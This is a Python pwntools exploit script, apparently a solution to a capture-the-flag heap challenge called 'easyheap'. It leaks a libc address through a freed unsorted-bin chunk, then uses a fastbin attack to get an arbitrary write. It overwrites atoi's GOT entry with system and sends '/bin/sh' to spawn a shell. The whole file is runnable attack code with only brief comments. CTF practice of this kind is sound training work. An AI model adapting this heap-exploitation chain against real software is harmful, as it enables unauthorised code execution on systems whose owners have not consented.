#!/usr/env/bin python3
from pwn import *

context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	if (DEBUG):
		context.log_level = "debug"
	
g_fname = "./easyheap"
g_elf = ELF(g_fname)
g_libcname = "./libc-2.23.so"

if (LOCAL):
	g_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	g_io = process(g_fname)
else:
	g_libc = ELF(g_libcname)
	g_io = remote()

def getpid():
	if (LOCAL & DEBUG):
		log.info("pid: %d" % g_io.proc.pid)
		pause()
	
def opt(idx):
	g_io.sendafter("Your choice:", str(idx))	

def add(size, content):
	opt(1)
	g_io.sendafter("Input group size:", str(size))
	g_io.sendafter("Input group member:", content)

def show(idx):
	opt(2)
	g_io.sendafter("Input group index:", str(idx))
	
def change(idx, size, content):
	opt(3)
	g_io.sendafter("Input group index:", str(idx))
	g_io.sendafter("Input group name:", str(size))
	g_io.sendafter("Input group member:", content)

def remove(idx):
	opt(4)
	g_io.sendafter("Input group index:", str(idx))

def exit():
	opt(5)

def pwn():
	debug_on()
	# 1. unsorted bin to leak arena's address -> calculate base of glibc
	add(0x80, "aaa") # 0
	add(0x80, "bbb") # 1
	remove(0)

	show(0)
	g_io.recvuntil("0 : ")
	res = g_io.recvline()[:6]
	addr_arena = u64(res.ljust(8, b"\x00")) - 88
	log.success("addr_arena = %#x" % addr_arena)

	off_arena = 0x3c4b20
	libc_base = addr_arena - off_arena
	addr_system = libc_base + g_libc.symbols["system"]

	log.success("libc@%#x\nsystem@%#x" % (libc_base, addr_system))
	remove(1)	

	# 2. fastbin attack: allocate to __realloc_hook, write one_gadget to it, then get shell
	add(0x60, "ccc") # 2
	add(0x50, "ddd") # 3
	remove(3)
	
	g_list = 0x6020a0
	fake_chunk = g_list + 0x18
	payload_fast_att = flat(['a'*0x60, 0x70, 0x61, fake_chunk])
	change(2, len(payload_fast_att) + 1, payload_fast_att)
	
	add(0x50, "eee") # 4

	payload_hijack = flat(g_list + 8)
	add(0x50, payload_hijack)

	# define write_to()
	def write_to(addr, size, data):
		change(2, 8, p64(addr))
		change(0, size, data)	
	
	write_to(g_elf.got["atoi"], 8, p64(addr_system))
	
	#getpid()
	# getshell
	g_io.sendafter("Your choice:", "/bin/sh")

if "__main__" == __name__:
	pwn()
	g_io.interactive()
